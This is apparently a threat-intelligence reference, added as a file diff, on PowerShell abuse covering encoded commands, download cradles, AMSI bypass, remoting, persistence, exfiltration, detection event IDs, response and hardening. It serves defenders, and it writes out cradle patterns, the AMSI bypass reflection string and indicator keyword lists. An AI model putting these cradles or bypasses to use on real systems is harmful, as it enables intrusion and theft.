@@ -1,0 +1,121 @@
+PowerShell-Based Attacks — Threat Intelligence Reference
+=========================================================
+
+MITRE ATT&CK: T1059.001 (PowerShell), T1086 (legacy), T1027 (Obfuscated Files),
+              T1140 (Deobfuscate/Decode), T1547.001 (Registry Run Keys via PS)
+Severity: HIGH to CRITICAL — PowerShell is the most common post-exploitation framework on Windows
+
+Overview
+--------
+PowerShell is a legitimate Windows management framework that is heavily abused by threat actors 
+for execution, persistence, lateral movement, and data exfiltration. Because it is built into 
+Windows and often whitelisted, it is a primary tool for both commodity malware and advanced 
+persistent threats (APTs). Living-off-the-land (LotL) attacks that use PowerShell leave minimal 
+disk artifacts and evade traditional AV.
+
+Key Abuse Techniques
+---------------------
+1. Encoded Command Execution (T1027 + T1059.001)
+   - Attackers encode payloads as Base64 to bypass simple keyword detection.
+   - Command: powershell.exe -EncodedCommand <Base64>
+   - Tools: Invoke-Obfuscation, PowerShell Empire, Cobalt Strike.
+   - Indicators: -enc or -EncodedCommand in process command line, long base64 strings,
+                 frombase64string in script content.
+
+2. Download Cradle / Fileless Execution
+   - Download and execute scripts entirely in memory without touching disk.
+   - Pattern: IEX (Invoke-Expression) + (New-Object Net.WebClient).DownloadString('http://...')
+   - Also: IEX (iwr http://...) — Invoke-WebRequest shorthand.
+   - Indicators: Net.WebClient, WebClient, DownloadString, IEX, curl | bash equivalent,
+                 outbound HTTP/HTTPS from PowerShell process.
+
+3. AMSI Bypass (Anti-Malware Scan Interface)
+   - Modern PS versions send scripts to AMSI (Windows Defender) for scanning.
+   - Attackers patch AMSI in memory to disable it before running malicious scripts.
+   - Common patterns: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'),
+                      amsiInitFailed, AmsiScanBuffer patch.
+   - Indicators: PowerShell script containing "amsi" + byte array manipulation.
+
+4. PowerShell Remoting (T1021.006)
+   - Enable-PSRemoting, Enter-PSSession, Invoke-Command -ComputerName for lateral movement.
+   - Legitimate but heavily abused; creates WinRM sessions on port 5985/5986.
+   - Indicators: New WinRM connections (Event ID 6, Microsoft-Windows-WinRM/Operational),
+                 unusual inter-host PowerShell sessions.
+
+5. Persistence via PowerShell (T1547.001, T1053.005)
+   - Registry: New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+   - Scheduled Task: Register-ScheduledTask
+   - WMI Subscription: attacker creates permanent WMI event subscription to run PS on trigger.
+   - Indicators: schtasks creation by PS, registry modifications to Run keys.
+
+6. Reconnaissance via PowerShell
+   - Get-ADUser, Get-ADComputer, Get-NetLocalGroup, Get-NetShare, nltest /domain_trusts
+   - Tools: PowerView (part of PowerSploit), BloodHound SharpHound collector.
+   - Indicators: AD queries from workstations, LDAP search activity.
+
+7. Data Exfiltration
+   - Compress-Archive + Invoke-WebRequest POST / curl to external server.
+   - DNS exfiltration via Resolve-DnsName with encoded data in subdomains.
+   - Indicators: Large data transferred via PowerShell, unusual DNS query volumes.
+
+Common Frameworks & Tools
+--------------------------
+- Metasploit / Meterpreter: PowerShell payloads for stager delivery.
+- Cobalt Strike: PS-based beacon delivery, PS reflective DLL injection.
+- PowerShell Empire: Full C2 framework, entirely PS-based.
+- PowerSploit: PowerView, PowerUp, Invoke-Mimikatz (PS wrapper).
+- Nishang: Offensive PS scripts including reverse shells and recon tools.
+
+Detection Signals
+-----------------
+- Windows Event ID 4104: Script block logging — logs full script content (enable this!)
+- Windows Event ID 4103: Module logging — logs all cmdlet executions
+- Windows Event ID 4688: Process creation with full command line (requires audit policy)
+- Sysmon Event ID 1: Process creation — captures full PS command line
+- Sysmon Event ID 3: Network connection — PS process making external connections
+- PS Transcription logs (if enabled): Full session transcripts in C:\PSTranscripts\
+- Indicators in command line: -enc, -nop (NoProfile), -w hidden (WindowStyle Hidden),
+  -exec bypass (ExecutionPolicy Bypass), IEX, DownloadString, WebClient, FromBase64String,
+  Invoke-Expression, -NonInteractive, -NoExit
+
+Behavioral Patterns of Concern
+--------------------------------
+- PowerShell spawned by Office applications (Word, Excel) → malicious macro
+- PowerShell spawned by web servers (IIS w3wp.exe) → web shell executing PS
+- PowerShell making outbound connections to unusual IPs/domains
+- PS execution policy bypass attempts
+- Long / obfuscated command lines (>500 characters with random strings)
+- PS process creating new scheduled tasks or modifying registry Run keys
+
+Response Actions
+----------------
+1. Terminate the suspicious PS process immediately.
+2. Isolate the host if remote connections or persistence were established.
+3. Review Event ID 4104 (script block) logs for full script content.
+4. Check PS transcription logs if enabled.
+5. Hunt laterally: check if PS Remoting was used to pivot to other hosts.
+6. Review scheduled tasks, WMI subscriptions, and Run key entries on the host.
+7. Pull process tree: what spawned powershell.exe? (parent process is key)
+8. Check network connections made by the PS process (Sysmon Event ID 3).
+
+Hardening Recommendations
+--------------------------
+- Enable PowerShell Constrained Language Mode for non-admin users.
+- Enable Script Block Logging (HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging).
+- Enable Module Logging and Transcription.
+- Deploy WDAC (Windows Defender Application Control) to restrict unsigned PS scripts.
+- Use Just Enough Administration (JEA) to limit PS Remoting capabilities.
+- Block PowerShell 2.0 (bypasses all logging): Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root.
+- Alert on powershell.exe with -EncodedCommand, -nop, -w hidden, or IEX in arguments.
+
+SOAR Playbook
+-------------
+Trigger: PowerShell process with encoded command, download cradle, or AMSI bypass patterns.
+Auto-actions: (1) Create HIGH/CRITICAL incident, (2) Pull process command line and parent,
+              (3) Check for network connections from PS process, (4) Alert analyst with full context.
+
+Related CVEs
+------------
+- CVE-2017-0199: OLE/COM execution via Office documents — common PS dropper vector.
+- CVE-2022-30190 (Follina/MSDT): Word document triggering MSDT → PowerShell execution.
+- CVE-2021-34527 (PrintNightmare): Exploited via PowerShell for privilege escalation.
